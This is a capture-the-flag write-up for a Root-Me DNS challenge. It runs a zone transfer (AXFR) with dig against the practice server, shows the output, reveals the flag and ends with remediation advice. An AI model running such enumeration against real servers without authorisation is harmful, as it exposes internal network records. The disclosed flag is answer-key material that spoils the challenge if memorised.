# DNS - zone transfert

- **Category:** Network (Root-Me)
- **Difficulty:** Easy
- **Objective:** Exploit a misconfigured DNS server to perform a zone transfer (AXFR) and retrieve hidden records or internal domain information.

## 1. Traffic Analysis
By inspecting the target infrastructure and identifying an open name service on a non-standard port, we analyze the possibility of querying the server for a full copy of its DNS zone database (AXFR).
- **Domain:** `ch11.challenge01.root-me.org`
- **Host:** `challenge01.root-me.org`
- **Port:** `54011`

## 2. Exploitation
Executing the zone transfer query using native Linux CLI tools:
- **CLI Command:** Using `dig` with the AXFR query type targeting the specific port and domain:
  ```bash
  dig axfr @challenge01.root-me.org -p 54011 ch11.challenge01.root-me.org```
- **Extracted Output:**
~~~bash
; <<>> DiG 9.18.39-0ubuntu0.22.04.7-Ubuntu <<>> axfr @challenge01.root-me.org -p 54011 ch11.challenge01.root-me.org
; (2 servers found)
;; global options: +cmd
ch11.challenge01.root-me.org. 604800 IN    SOA    ch11.challenge01.root-me.org. root.ch11.challenge01.root-me.org. 2 604800 86400 2419200 604800
ch11.challenge01.root-me.org. 604800 IN    TXT    "DNS transfer secret key : CBkFRwfNMMtRjHY"
ch11.challenge01.root-me.org. 604800 IN    NS    ch11.challenge01.root-me.org.
ch11.challenge01.root-me.org. 604800 IN    A    127.0.0.1
challenge01.ch11.challenge01.root-me.org. 604800 IN A 192.168.27.101
ch11.challenge01.root-me.org. 604800 IN    SOA    ch11.challenge01.root-me.org. root.ch11.challenge01.root-me.org. 2 604800 86400 2419200 604800
~~~

- **Flag:** `CBkFRwfNMMtRjHY`
  
## 3. Key Takeaways & Remediation
- **Vulnerability:** Unrestricted AXFR (Zone Transfer) requests allow any external client to map out internal domain structures, subdomains, and read sensitive records (such as TXT keys).
- **Remediation:** Restrict DNS zone transfers strictly to authorized secondary/slave name servers (using TSIG or IP ACLs) and disable public AXFR access on primary servers.
